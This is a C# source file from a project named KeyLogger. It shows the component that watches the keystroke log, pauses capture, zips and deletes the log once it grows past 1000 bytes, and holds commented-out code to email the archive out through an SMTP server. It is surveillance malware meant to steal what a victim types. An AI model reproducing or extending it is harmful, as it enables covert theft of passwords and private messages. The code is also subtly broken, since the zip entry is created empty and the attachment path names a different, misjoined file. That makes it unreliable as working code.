using System.IO;
using System.IO.Compression;

using System.Windows.Forms;

namespace KeyLogger
{
    public class DateWatcher
    {
        private static string FileName = Application.StartupPath + @"\log.txt";

        public FileSystemWatcher Track()
        {
            var fsw = new FileSystemWatcher
            {
                Path = Path.GetDirectoryName(FileName),
                Filter = Path.GetFileName(FileName),
                EnableRaisingEvents = true
            };

            fsw.Changed += TheFileChanged;

            return fsw;
        }


        private void TheFileChanged(object sender, FileSystemEventArgs e)
        {
            if (e.ChangeType == WatcherChangeTypes.Changed)
            {
                //try
                //{
                    var info = new FileInfo(e.FullPath);
                    var theSize = info.Length;

                    if (theSize > 1000)
                    {
                        InterceptKeys.StopWorking = true;

                    using (FileStream fs = new FileStream(Application.StartupPath + @"\Archive.zip", FileMode.Create))
                    using (ZipArchive arch = new ZipArchive(fs, ZipArchiveMode.Create))
                    {
                        arch.CreateEntry(FileName, CompressionLevel.Fastest);
                    }

                        File.Delete(FileName);

                        //MailMessage mail = new MailMessage("you@yourcompany.com", "user@hotmail.com");
                        //SmtpClient client = new SmtpClient();
                        //client.Port = 25;
                        //client.DeliveryMethod = SmtpDeliveryMethod.Network;
                        //client.UseDefaultCredentials = false;
                        //client.Host = "smtp.google.com";
                        //mail.Subject = "this is a test email.";
                        //mail.Body = "this is my test email body";

                        //var attachment = new System.Net.Mail.Attachment(Application.StartupPath + "Archive.7z");
                        //mail.Attachments.Add(attachment);

                        //client.Send(mail);

                        InterceptKeys.StopWorking = false;
                    }
                //}
                //catch (Exception ex)
                //{
                //}
            }
        }
    }
}